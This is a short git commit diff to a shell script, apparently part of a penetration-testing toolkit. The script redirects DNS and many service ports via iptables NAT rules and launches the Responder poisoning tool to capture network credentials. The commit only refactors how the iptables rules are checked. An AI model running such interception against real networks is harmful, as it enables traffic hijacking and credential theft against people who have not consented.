8119f6a51bf9c7ad7e24f484c460b49b1dab2831
s0i37 <s0i37@work>
2021-05-13 18:20:19 +0500

    improving iptables usage in on_network/responder

--- on_network/responder.sh
+++ on_network/responder.sh
@@ -2,18 +2,20 @@
 
 echo '[*] running Responder attacks'
 
-if ! iptables -t nat -vnL PREROUTING | grep "$1" | grep -q 53; then
+iptables -t nat -vnL PREROUTING > /tmp/iptables.txt
+
+if ! cat /tmp/iptables.txt | grep "$1" | grep -q 53; then
   iptables -t nat -A PREROUTING -i "$1" -p udp --dport 53 -j REDIRECT --to-port 53
 fi
 
 for port in 21 25 80 88 110 143 389 443 445 1433 3389
 do
-	if ! iptables -t nat -vnL PREROUTING | grep "$1" | grep -q " $port"; then
+	if ! cat /tmp/iptables.txt | grep "$1" | grep -q " $port"; then
 	  iptables -t nat -A PREROUTING -i "$1" -p tcp --dport $port -j REDIRECT --to-port $port
 	fi
 done
 
-[[ $(pgrep -f bin/responder) = '' ]] && {
+[[ $(pgrep -f Responder.py) = '' ]] && {
 	screen -dmS responder responder -I "$1" -r -d -w -F
 }
 
